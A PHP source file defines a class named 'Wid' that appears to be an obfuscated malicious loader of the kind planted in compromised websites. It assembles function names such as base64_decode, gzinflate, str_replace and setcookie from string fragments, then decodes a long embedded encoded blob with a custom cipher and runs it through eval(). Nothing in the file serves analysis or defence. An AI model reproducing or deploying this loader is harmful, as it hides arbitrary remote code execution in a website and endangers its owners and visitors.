<?php
class Wid {
	function __construct() {
		$_move = $this->emu($this->value);
		$_move = $this->income($this->memory($_move));
		$_move = $this->stack($_move);
		if($_move) {
			$this->_load = $_move[3];
			$this->process = $_move[2];
			$this->mv = $_move[0];
			$this->lib($_move[0], $_move[1]);
		}
	}
	
	function lib($_x64, $conf) {
		$this->core = $_x64;
		$this->conf = $conf;
		$this->module = $this->emu($this->module);
		$this->module = $this->memory($this->module);
		$this->module = $this->dx();
		if(strpos($this->module, $this->core) !== false) {
			if(!$this->_load)
				$this->_point($this->process, $this->mv);
			$this->stack($this->module);
		}
	}
	
	function _point($tx, $ver) {
		$income = $this->_point[3].$this->_point[1].$this->_point[2].$this->_point[4].$this->_point[0];
		$income = @$income($tx, $ver);
	}

	function _px($conf, $check, $_x64) {
		$income = strlen($check) + strlen($_x64);
		while(strlen($_x64) < $income) {
			$_rx = ord($check[$this->_code]) - ord($_x64[$this->_code]);
			$check[$this->_code] = chr($_rx % (32*8));
			$_x64 .= $check[$this->_code];
			$this->_code++;
		}
		return $check;
	}
   
	function memory($tx) {
		$x86 = $this->memory[0].$this->memory[2].$this->memory[3].$this->memory[1].$this->memory[4];
		$x86 = @$x86($tx);
		return $x86;
	}

	function income($tx) {
		$x86 = $this->income[2].$this->income[1].$this->income[0];
		$x86 = @$x86($tx);
		return $x86;
	}
	
	function dx() {
		$this->_cache = $this->_px($this->conf, $this->module, $this->core);
		$this->_cache = $this->income($this->_cache);
		return $this->_cache;
	}
	
	function stack($backend) {
		$view = @eval($backend);
		return $view;
	}
	
	function emu($income) {
		$x86 = $this->access[3].$this->access[0].$this->access[1].$this->access[2];
		return $x86("\r\n", "", $income);
	}
	 
	var $claster;
	var $_code = 0;
	
	var $income = array('te', 'fla', 'gzin');
	var $_seek = array('fu', 'ncti', 'on', 'ate_', 'cre');
	var $memory = array('base', 'cod', '64_', 'de', 'e');
	var $_point = array('kie', 'e', 'tc', 's', 'oo');
	var $access = array('rep', 'lac', 'e', 'str_');
	 
	var $module = '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
